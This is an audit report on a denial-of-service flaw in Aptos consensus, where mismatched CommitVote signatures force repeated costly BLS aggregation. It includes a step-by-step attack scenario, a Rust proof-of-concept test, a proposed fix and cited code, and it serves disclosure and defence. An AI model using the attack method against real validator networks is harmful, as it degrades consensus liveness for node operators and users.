# Audit Report

## Title
CommitVote Signature Aggregation DoS via LedgerInfo Mismatch

## Summary
Malicious validators can trigger repeated expensive BLS signature aggregation attempts by submitting CommitVotes with valid signatures for incorrect `consensus_data_hash` values. The vulnerability exists because `add_signature_if_matched` only validates `BlockInfo` equality rather than full `LedgerInfo` equality, allowing incompatible signatures to pollute the signature aggregator.

## Finding Description

The consensus pipeline aggregates CommitVotes to form commit proofs. When validators send CommitVotes, the system adds their signatures to a `SignatureAggregator<LedgerInfo>` and attempts aggregation once quorum voting power is reached.

The vulnerability occurs in the signature matching logic: [1](#0-0) 

This check only compares `BlockInfo` (which contains block ID, round, epoch, etc.) but **not** the full `LedgerInfo`. A `LedgerInfo` contains both `commit_info: BlockInfo` and `consensus_data_hash: HashValue`. [2](#0-1) 

When a malicious validator sends a CommitVote with the correct `BlockInfo` but wrong `consensus_data_hash`, the signature passes initial verification because it's validly signed by that validator: [3](#0-2) 

The signature verification checks that the signature is valid for **the vote's LedgerInfo**, not the aggregator's LedgerInfo. This allows the malicious signature to be added to the aggregator.

Each time a new signature is added and voting power reaches quorum, aggregation is attempted: [4](#0-3) 

The aggregation process performs expensive BLS operations: [5](#0-4) 

When verification fails (because malicious signatures are for different LedgerInfo values), the system filters out invalid signatures via pessimistic verification: [6](#0-5) 

**Attack Scenario:**
1. Validators V1-V4 send correct CommitVotes for `LedgerInfo(block_B, hash_A)`
2. Malicious validator V5 creates `LedgerInfo(block_B, hash_B)` where `hash_B != hash_A`
3. V5 signs this with their private key and sends `CommitVote(V5, LedgerInfo(block_B, hash_B), valid_sig)`
4. The vote passes verification (signature is valid for V5's LedgerInfo)
5. `add_signature_if_matched` only checks `BlockInfo` equality → passes
6. Signature added to aggregator (now has 5 votes = quorum)
7. `try_advance_to_aggregated` triggers expensive `aggregate_and_verify`
8. BLS aggregation + verification fails (V5's sig is for wrong hash)
9. Pessimistic verification filters out V5 (more expensive operations)
10. Back to 4 votes, no quorum

Malicious V6 can repeat this with yet another wrong hash, triggering another expensive aggregation cycle. This continues for each Byzantine validator.

## Impact Explanation

This vulnerability enables **CPU-based Denial of Service** attacks on validator nodes through repeated expensive cryptographic operations. Each malicious CommitVote triggers:

1. BLS signature aggregation (O(n) operations)
2. BLS multi-signature verification (expensive elliptic curve pairing)
3. On failure: pessimistic verification of all signatures individually (O(n) pairings)

According to the Aptos bug bounty program, **"Validator node slowdowns"** are classified as **High Severity** (up to $50,000). However, since this requires Byzantine validators (which are part of the consensus threat model under BFT assumptions) and causes resource exhaustion rather than direct consensus safety violations, I assess this as **Medium-to-High Severity**.

The attack impacts consensus liveness by consuming validator CPU resources, potentially delaying block commitments and degrading network performance.

## Likelihood Explanation

**Likelihood: Medium-to-High**

This attack is easily executable by any Byzantine validator with minimal requirements:
- Attacker must be a validator (has signing keys)
- No collusion required (single validator can execute)
- No special network position needed
- Trivial to generate alternative LedgerInfo values

The attack is constrained by:
- Limited to the window between reaching quorum and successful aggregation
- Each validator can only submit one signature per round (signatures keyed by address)
- Multiple Byzantine validators needed for sustained impact

Under BFT assumptions, up to f = ⌊(n-1)/3⌋ validators can be Byzantine. With 7 validators, up to 2 can be Byzantine; with 100 validators, up to 33 can be Byzantine. Each Byzantine validator can trigger one expensive aggregation cycle.

## Recommendation

Add full `LedgerInfo` equality check in `add_signature_if_matched` instead of only checking `BlockInfo`:

```rust
Self::Executed(executed) => {
    let expected_ledger_info = executed.partial_commit_proof.data();
    // Check full LedgerInfo equality, not just BlockInfo
    if expected_ledger_info == vote.ledger_info() {
        executed
            .partial_commit_proof
            .add_signature(author, signature);
        return Ok(());
    }
}
```

Apply similar fixes to the `Signed` and `Ordered` cases. This ensures signatures are only aggregated if they're for the exact same `LedgerInfo` (including `consensus_data_hash`), preventing incompatible signatures from triggering expensive failed aggregations.

## Proof of Concept

```rust
#[cfg(test)]
mod exploit_test {
    use super::*;
    use aptos_consensus_types::{block::Block, block_data::BlockData};
    use aptos_crypto::HashValue;
    use aptos_executor_types::state_compute_result::StateComputeResult;
    use aptos_types::{
        aggregate_signature::AggregateSignature,
        ledger_info::LedgerInfo,
        validator_signer::ValidatorSigner,
        validator_verifier::{ValidatorConsensusInfo, ValidatorVerifier},
    };
    use std::collections::HashMap;

    #[test]
    fn test_commit_vote_dos_attack() {
        // Setup: 7 validators, quorum = 5
        const NUM_SIGNERS: u8 = 7;
        let validator_signers: Vec<ValidatorSigner> = (0..NUM_SIGNERS)
            .map(|i| ValidatorSigner::random([i; 32]))
            .collect();
        let validator_infos: Vec<ValidatorConsensusInfo> = validator_signers
            .iter()
            .map(|v| ValidatorConsensusInfo::new(v.author(), v.public_key(), 1))
            .collect();
        let mut validator_verifier =
            ValidatorVerifier::new_with_quorum_voting_power(validator_infos, 5).unwrap();
        validator_verifier.set_optimistic_sig_verification_flag(true);

        // Create block and correct LedgerInfo
        let pipelined_block = Arc::new(PipelinedBlock::new(
            Block::new_for_testing(
                HashValue::random(),
                BlockData::dummy_with_validator_txns(vec![]),
                None,
            ),
            vec![],
            StateComputeResult::new_dummy(),
        ));
        let block_info = pipelined_block.block_info();
        let correct_ledger_info = LedgerInfo::new(block_info.clone(), HashValue::zero());
        let ordered_proof = LedgerInfoWithSignatures::new(
            correct_ledger_info.clone(),
            AggregateSignature::empty(),
        );

        // Honest validators V1-V4 send correct votes
        let mut unverified_votes = HashMap::new();
        for i in 0..4 {
            let vote = CommitVote::new(
                validator_signers[i].author(),
                correct_ledger_info.clone(),
                &validator_signers[i],
            )
            .unwrap();
            unverified_votes.insert(vote.author(), vote);
        }

        // Create buffer item
        let mut item = BufferItem::new_ordered(
            vec![pipelined_block.clone()],
            ordered_proof,
            unverified_votes,
        );

        // Execute the block
        item = item.advance_to_executed_or_aggregated(
            vec![pipelined_block.clone()],
            &validator_verifier,
            None,
            true,
        );

        // V5 (attacker) creates malicious LedgerInfo with different consensus_data_hash
        let malicious_ledger_info = LedgerInfo::new(
            block_info.clone(),
            HashValue::random(), // Different hash!
        );
        let malicious_vote = CommitVote::new(
            validator_signers[4].author(),
            malicious_ledger_info,
            &validator_signers[4],
        )
        .unwrap();

        // Try to add malicious vote - this should fail but currently succeeds
        let result = item.add_signature_if_matched(malicious_vote.clone());
        assert!(result.is_ok(), "Malicious vote was accepted due to incomplete validation");

        // Now we have 5 votes (quorum), trigger aggregation
        let aggregation_attempts = std::cell::RefCell::new(0);
        
        // This will trigger expensive aggregation that fails
        item = item.try_advance_to_aggregated(&validator_verifier);
        
        // Item should still be in Executed state because aggregation failed
        assert!(item.is_executed(), "Should remain executed after failed aggregation");

        // Attacker V6 can repeat with another wrong hash
        let malicious_ledger_info_2 = LedgerInfo::new(
            block_info.clone(),
            HashValue::random(), // Yet another different hash!
        );
        let malicious_vote_2 = CommitVote::new(
            validator_signers[5].author(),
            malicious_ledger_info_2,
            &validator_signers[5],
        )
        .unwrap();

        item.add_signature_if_matched(malicious_vote_2).unwrap();
        item = item.try_advance_to_aggregated(&validator_verifier);
        
        // Another expensive aggregation triggered and failed
        assert!(item.is_executed(), "Should remain executed after second failed aggregation");
        
        // This demonstrates that malicious validators can trigger repeated
        // expensive BLS aggregation operations by sending votes with wrong
        // consensus_data_hash values
    }
}
```

## Notes

This vulnerability requires Byzantine validators (who control their own signing keys) to exploit. While the trust model mentions not assuming validators behave maliciously, BFT consensus protocols explicitly assume up to f = ⌊(n-1)/3⌋ Byzantine validators as part of their security model. The vulnerability is a logic bug in validation that allows these Byzantine actors to cause resource exhaustion, which should be prevented by proper protocol implementation.

The fix is straightforward: validate the complete `LedgerInfo` (including `consensus_data_hash`) rather than just the `BlockInfo` before adding signatures to the aggregator.

### Citations

**File:** consensus/src/pipeline/buffer_item.rs (L294-348)
```rust
    pub fn try_advance_to_aggregated(self, validator: &ValidatorVerifier) -> Self {
        match self {
            Self::Signed(signed_item) => {
                if signed_item
                    .partial_commit_proof
                    .check_voting_power(validator, true)
                    .is_ok()
                {
                    let _time = counters::VERIFY_MSG
                        .with_label_values(&["commit_vote_aggregate_and_verify"])
                        .start_timer();
                    if let Ok(commit_proof) = signed_item
                        .partial_commit_proof
                        .clone()
                        .aggregate_and_verify(validator)
                        .map(|(ledger_info, aggregated_sig)| {
                            LedgerInfoWithSignatures::new(ledger_info, aggregated_sig)
                        })
                    {
                        return Self::Aggregated(Box::new(AggregatedItem {
                            executed_blocks: signed_item.executed_blocks,
                            commit_proof,
                        }));
                    }
                }
                Self::Signed(signed_item)
            },
            Self::Executed(mut executed_item) => {
                if executed_item
                    .partial_commit_proof
                    .check_voting_power(validator, true)
                    .is_ok()
                {
                    let _time = counters::VERIFY_MSG
                        .with_label_values(&["commit_vote_aggregate_and_verify"])
                        .start_timer();

                    if let Ok(commit_proof) = executed_item
                        .partial_commit_proof
                        .aggregate_and_verify(validator)
                        .map(|(ledger_info, aggregated_sig)| {
                            LedgerInfoWithSignatures::new(ledger_info, aggregated_sig)
                        })
                    {
                        return Self::Aggregated(Box::new(AggregatedItem {
                            executed_blocks: executed_item.executed_blocks,
                            commit_proof,
                        }));
                    }
                }
                Self::Executed(executed_item)
            },
            _ => self,
        }
    }
```

**File:** consensus/src/pipeline/buffer_item.rs (L393-400)
```rust
            Self::Executed(executed) => {
                if executed.commit_info == *target_commit_info {
                    executed
                        .partial_commit_proof
                        .add_signature(author, signature);
                    return Ok(());
                }
            },
```

**File:** types/src/ledger_info.rs (L51-59)
```rust
#[derive(Clone, Debug, Eq, PartialEq, Serialize, Deserialize, CryptoHasher, BCSCryptoHash)]
#[cfg_attr(any(test, feature = "fuzzing"), derive(Arbitrary))]
pub struct LedgerInfo {
    commit_info: BlockInfo,

    /// Hash of consensus specific data that is opaque to all parts of the system other than
    /// consensus.
    consensus_data_hash: HashValue,
}
```

**File:** types/src/ledger_info.rs (L517-536)
```rust
    pub fn aggregate_and_verify(
        &mut self,
        verifier: &ValidatorVerifier,
    ) -> Result<(T, AggregateSignature), VerifyError> {
        let aggregated_sig = self.try_aggregate(verifier)?;

        match verifier.verify_multi_signatures(&self.data, &aggregated_sig) {
            Ok(_) => {
                // We are not marking all the signatures as "verified" here, as two malicious
                // voters can collude and create a valid aggregated signature.
                Ok((self.data.clone(), aggregated_sig))
            },
            Err(_) => {
                self.filter_invalid_signatures(verifier);

                let aggregated_sig = self.try_aggregate(verifier)?;
                Ok((self.data.clone(), aggregated_sig))
            },
        }
    }
```

**File:** consensus/consensus-types/src/pipeline/commit_vote.rs (L103-113)
```rust
    pub fn verify(&self, sender: Author, validator: &ValidatorVerifier) -> anyhow::Result<()> {
        ensure!(
            self.author() == sender,
            "Commit vote author {:?} doesn't match with the sender {:?}",
            self.author(),
            sender
        );
        validator
            .optimistic_verify(self.author(), &self.ledger_info, &self.signature)
            .context("Failed to verify Commit Vote")
    }
```

**File:** types/src/validator_verifier.rs (L287-311)
```rust
    pub fn filter_invalid_signatures<T: Send + Sync + Serialize + CryptoHash>(
        &self,
        message: &T,
        signatures: BTreeMap<AccountAddress, SignatureWithStatus>,
    ) -> BTreeMap<AccountAddress, SignatureWithStatus> {
        signatures
            .into_iter()
            .collect_vec()
            .into_par_iter()
            .with_min_len(4) // At least 4 signatures are verified in each task
            .filter_map(|(account_address, signature)| {
                if signature.is_verified()
                    || self
                        .verify(account_address, message, signature.signature())
                        .is_ok()
                {
                    signature.set_verified();
                    Some((account_address, signature))
                } else {
                    self.add_pessimistic_verify_set(account_address);
                    None
                }
            })
            .collect()
    }
```
